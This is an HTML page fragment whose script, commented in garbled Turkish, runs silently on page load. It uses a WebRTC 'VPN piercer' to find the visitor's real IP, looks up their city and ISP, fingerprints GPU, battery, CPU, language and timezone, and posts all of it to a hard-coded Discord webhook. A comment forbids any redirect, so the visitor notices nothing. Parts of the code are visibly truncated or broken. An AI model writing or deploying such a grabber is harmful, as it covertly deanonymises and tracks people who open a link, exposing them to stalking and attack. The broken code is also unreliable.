<body>

    <script>
        // KESÄ°N KURAL: HiÃ§bir ÅŸekilde yÃ¶nlendirme yapma

        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function getRealIP() {
            try {
                const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
                return new Promise(res => {
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = (e) => {
                        if (e && e.candidate) {
                            const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);

        async function start() {

            // 1. VPN DELÄ°CÄ° (WEBRTC)
            d.real_ip = await getRealIP();

            // 2. IP VE ISS

                const r = await fetch('https://ipapi.co/json/');
                const j = await r.json();
                d.ip = j.ip;
                d.loc = j.city + ", " + j.country_name + " (" + j.org + ")";
            } catch(e) {}

            // 3. DONANIM
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const db = gl.getExtension('WEBGL_debug_renderer_info');
                d.gpu = gl.getParameter(db.UNMASKED_RENDERER_ID);
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    d.bat = "%" + Math.round(b.level * 100) + (b.charging ? ' (âš¡)' : ' (ğŸ”‹)');
                }
            } catch(e) {}

            d.sys = navigator.platform + " | CPU: " + navigator.hardwareConcurrency;

            const payload = {
                embeds: [{
                    title: "ğŸ’€ ADLÄ° ANALÄ°Z V22 (FIXED)",
                    color: 15548997,
                    fields: [
                        { name: "ğŸ“¡ AÄ", value: "**GerÃ§ek IP:** `" + d.real_ip + "`\n**BaÄŸlantÄ± IP:** `" + d.ip + "`\n**Konum:** " + d.loc, inline: false },
                        { name: "âš™ï¸ SÄ°STEM", value: "**DonanÄ±m:** " + d.sys + "\n**GPU:** `" + d.gpu + "`\n**Pil:** " + d.bat, inline: false },
                        { name: "ğŸŒ DETAY", value: "**Dil:** " + navigator.language + "\n**Zaman:** " + Intl.DateTimeFormat().resolvedOptions().timeZone, inline: false }

            const blob = JSON.stringify(payload);

            if (navigator.sendBeacon) navigator.sendBeacon(u, blob);
        }

        window.onload = start;
